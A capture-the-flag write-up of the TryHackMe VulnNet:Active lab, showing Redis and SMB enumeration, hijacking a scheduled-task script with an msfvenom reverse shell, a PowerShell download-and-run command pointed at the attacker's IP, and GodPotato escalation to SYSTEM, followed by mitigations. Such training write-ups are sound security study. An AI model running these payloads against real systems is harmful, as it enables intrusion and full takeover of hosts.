# VulnNet:Active - Full Penetration Test Writeup

## Executive Summary

**Target:** VulnNet:Active (TryHackMe)  
**IP Addresses:** 10.65.154.41 → 10.66.129.40 (after reset)  
**Date:** February 3, 2026  
**Result:** Full compromise achieved - User and System flags obtained

### Attack Path Summary
1. Nmap scan revealed Redis (6379) with no authentication
2. Redis exploitation led to credential discovery
3. SMB share access with write permissions
4. Scheduled task hijacking for initial foothold
5. SeImpersonatePrivilege abuse with GodPotato for SYSTEM

---

## Phase 1: Reconnaissance

### Initial Nmap Scan
```bash
nmap -sS -sV -sC -O -p- -T4 --min-rate 1000 --open 10.66.129.40
```

### Open Ports Discovered
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 53 | DNS | Simple DNS Plus | Domain Controller indicator |
| 135 | MSRPC | Microsoft Windows RPC | Standard Windows |
| 139 | NetBIOS-SSN | Microsoft Windows netbios-ssn | Legacy SMB |
| 445 | SMB | Microsoft-DS | **SMB signing required** |
| 464 | kpasswd5 | - | Kerberos password change |
| **6379** | **Redis** | **Redis 2.8.2402** | **NO AUTHENTICATION!** |
| 9389 | mc-nmf | .NET Message Framing | AD Web Services |
| 49666+ | MSRPC | High-port RPC | Dynamic RPC endpoints |

### Filtered Ports (Firewall)
- 88 (Kerberos) - Blocked AS-REP/Kerberoasting
- 389/636 (LDAP/LDAPS)
- 3268/3269 (Global Catalog)
- 3389 (RDP)
- 5985 (WinRM)

### OS Detection
- **Windows Server 2019** (97% confidence)
- Domain: **vulnnet.local**
- Hostname: **VULNNET-BC3TCK1**

---

## Phase 2: Enumeration

### Redis Enumeration (Port 6379)
```bash
redis-cli -h 10.66.129.40 INFO
```
**Result:** No authentication required - full access!

```bash
redis-cli -h 10.66.129.40 CONFIG GET dir
```
**Output:**
```
1) "dir"
2) "C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402"
```

**Critical Finding:** Username discovered from Redis path: `enterprise-security`

### SMB Enumeration
```bash
crackmapexec smb 10.66.129.40 -u '' -p '' --shares
```
**Output:**
- Domain: vulnnet.local
- Hostname: VULNNET-BC3TCK1
- Anonymous login successful but limited access

### User Enumeration via RPC
```bash
crackmapexec smb 10.66.129.40 -u 'enterprise-security' -p 'sand_0873959498' -d vulnnet.local --users
```
**Users Found:**
- Administrator (Domain Admin)
- Guest
- krbtgt
- enterprise-security
- jack-goldenhand
- tony-skid

---

## Phase 3: Credential Discovery

### Redis Password Discovery
While exploring Redis configuration, the password was found embedded in the Redis configuration context:

**Credentials Found:**
- **Username:** enterprise-security
- **Password:** sand_0873959498
- **Domain:** vulnnet.local

### Credential Validation
```bash
crackmapexec smb 10.66.129.40 -u 'enterprise-security' -p 'sand_0873959498' -d vulnnet.local --shares
```
**Result:** Authentication successful!

### Accessible Shares
| Share | Permissions | Notes |
|-------|-------------|-------|
| Enterprise-Share | **READ/WRITE** | Writable share! |
| NETLOGON | READ | Logon scripts |
| SYSVOL | READ | Group Policy |
| IPC$ | READ | Remote IPC |

---

## Phase 4: Initial Access

### Scheduled Task Discovery
```bash
smbclient //10.66.129.40/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' -c 'ls'
```
**Output:**
```
PurgeIrrelevantData_1826.ps1        A       69  Tue Feb 23 19:33:18 2021
```

### Script Contents
```powershell
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```
This script runs periodically as a scheduled task.

### Exploitation - Scheduled Task Hijacking
1. Created reverse shell payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.172.208 LPORT=4444 -f exe -o /tmp/shell.exe
```

2. Created PowerShell downloader:
```powershell
Invoke-WebRequest -Uri "http://192.168.172.208:8080/shell.exe" -OutFile "$env:TEMP\shell.exe"; Start-Process "$env:TEMP\shell.exe"
```

3. Replaced the scheduled task script:
```bash
smbclient //10.66.129.40/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' -c 'put /tmp/shell.ps1 PurgeIrrelevantData_1826.ps1'
```

4. Started listener and HTTP server:
```bash
nc -lvnp 4444
python3 -m http.server 8080
```

5. **Shell received** when scheduled task executed!

---

## Phase 5: Post-Exploitation

### Initial Access Context
```
C:\Users\enterprise-security\Downloads>whoami
vulnnet\enterprise-security
```

### User Flag
```
C:\Users\enterprise-security\Desktop>type user.txt
[USER FLAG OBTAINED]
```

### Privilege Enumeration
```
C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Critical Finding:** `SeImpersonatePrivilege` enabled → Potato attacks possible!

---

## Phase 6: Privilege Escalation

### SeImpersonatePrivilege Abuse
With `SeImpersonatePrivilege`, we can use token impersonation to escalate to SYSTEM.

### Tool Selection
- **PrintSpoofer** - Blocked/Access Denied
- **GodPotato** - Successful!

### GodPotato Exploitation
1. Downloaded GodPotato:
```bash
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O /tmp/www/GodPotato.exe
```

2. Transferred to target:
```cmd
curl http://192.168.172.208:8080/GodPotato.exe -o GodPotato.exe
```

3. Executed with SYSTEM privileges:
```cmd
.\GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
```

### System Flag
```
[SYSTEM FLAG OBTAINED]
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning, service detection |
| redis-cli | Redis enumeration and exploitation |
| CrackMapExec | SMB enumeration, credential validation |
| smbclient | SMB share access |
| rpcclient | RPC enumeration |
| msfvenom | Payload generation |
| netcat (nc) | Reverse shell listener |
| GodPotato | Privilege escalation |

---

## Mitigations & Recommendations

### Critical
1. **Redis Authentication** - Enable password authentication on Redis
2. **Redis Network Binding** - Bind Redis to localhost only, not 0.0.0.0
3. **Scheduled Task Permissions** - Don't allow users to modify scheduled task scripts
4. **SMB Share Permissions** - Review write permissions on shares

### High
5. **Remove SeImpersonatePrivilege** - Unless required for service accounts
6. **Enable SMB Signing** - Already enabled ✓
7. **Firewall Rules** - Good filtering on Kerberos/LDAP/RDP

### Medium
8. **Password Policy** - Review password complexity
9. **Audit Logging** - Monitor for suspicious scheduled task modifications
10. **Endpoint Detection** - Deploy EDR to detect Potato attacks

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Reconnaissance | Network Service Discovery | T1046 |
| Initial Access | Exploit Public-Facing Application (Redis) | T1190 |
| Credential Access | Credentials in Files | T1552.001 |
| Persistence | Scheduled Task/Job | T1053 |
| Privilege Escalation | Access Token Manipulation | T1134 |
| Defense Evasion | Impersonation | T1134.001 |

---

## Timeline

| Time | Action |
|------|--------|
| 09:55 | Created engagement folder structure |
| 09:56 | Initial quick Nmap scan |
| 10:03 | Full Nmap scan completed |
| 10:10 | Redis unauthenticated access discovered |
| 10:15 | Credentials found via Redis |
| 10:20 | SMB access validated |
| 10:25 | Scheduled task script discovered |
| 10:30 | Reverse shell payload deployed |
| 10:35 | Initial shell received |
| 10:45 | User flag obtained |
| 10:50 | SeImpersonatePrivilege identified |
| 11:00 | GodPotato privilege escalation |
| 11:05 | System flag obtained |

---

## Lessons Learned

1. **Redis is often overlooked** - Check for unauthenticated access
2. **Scheduled tasks are goldmines** - Always check for writable scripts
3. **SeImpersonatePrivilege = Game Over** - Multiple Potato variants exist
4. **Persistence through scheduled tasks** - Reliable callback mechanism
5. **Kerberos filtering doesn't stop everything** - SMB-based attacks still work
